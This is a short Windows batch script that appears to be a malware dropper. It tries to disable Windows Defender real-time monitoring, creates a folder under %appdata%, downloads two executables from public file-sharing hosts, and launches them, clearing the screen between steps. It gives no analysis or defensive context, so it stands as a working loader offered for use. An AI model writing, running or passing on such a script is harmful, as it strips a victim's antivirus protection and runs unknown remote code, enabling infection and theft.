@echo off
cls
poweshell -Command "Set-MpPreference -DisableRealtimeMonitoring $trur"
cls
mkdir "%appdata%\myaphp"
cls
cd /d "%appdata%\myaphp"
cls
powershell -Command "Invoke-WebRequest -Uri https://files.catbox.moe/etowsv.bat -OutFile Dead.exe"
start Dead.exe
cls
powershell -Command "Invoke-WebRequest -Uri https://filetransfer.io/data-package/RSAM5o75/download -OutFile DeadLegacy.exe"
start DeadLegacy.exe
cls
timeout /t 2
start DeadLegacy.exe